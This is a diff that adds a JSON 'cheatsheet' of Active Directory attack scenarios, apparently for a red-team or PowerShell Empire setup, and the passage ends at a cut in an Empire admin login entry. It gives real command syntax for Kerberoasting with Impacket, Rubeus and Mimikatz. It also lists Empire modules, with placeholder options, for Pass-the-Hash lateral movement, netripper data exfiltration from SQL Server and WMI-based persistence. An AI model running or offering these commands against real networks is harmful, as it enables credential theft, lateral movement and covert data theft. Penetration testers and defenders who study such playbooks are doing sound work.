@@ -1,3 +1,51 @@
+
+{
+  "description": "Demonstration Cheatsheet for Advanced Exploitation Scenarios",
+  "scenarios": {
+    "Kerberoasting": {
+      "tool": "Impacket or Rubeus",
+      "description": "Extract and crack Kerberos tickets for service accounts to uncover weak passwords.",
+      "commands": {
+        "Impacket": "GetUserSPNs.py <domain>/<username>:<password> -request",
+        "Rubeus": "Rubeus.exe kerberoast",
+        "Mimikatz": "kerberos::list /export"
+      }
+    },
+    "Pass-the-Hash": {
+      "description": "Demonstrate lateral movement using Pass-the-Hash technique.",
+      "tool": "PowerShell Empire",
+      "module": "credentials/pth",
+      "options": {
+        "User": "username_here",
+        "NTLM": "ntlm_hash_here",
+        "Target": "target_machine_name"
+      }
+    },
+    "Data Exfiltration": {
+      "description": "Show how to extract sensitive data from a compromised machine.",
+      "tool": "PowerShell Empire",
+      "module": "collection/netripper",
+      "options": {
+        "Application": "sqlserver.exe",
+        "PathToSave": "/path/to/save/data"
+      }
+    },
+    "Advanced Persistence": {
+      "description": "Establish advanced persistence using WMI events.",
+      "tool": "PowerShell Empire",
+      "module": "persistence/elevated/wmi",
+      "options": {
+        "Listener": "listener_name_here",
+        "DailyTime": "HH:mm"
+      }
+    }
+  }
+}
+
+
+
+
+
 {
   "api/admin/login": {
     "username": "empireadmin",
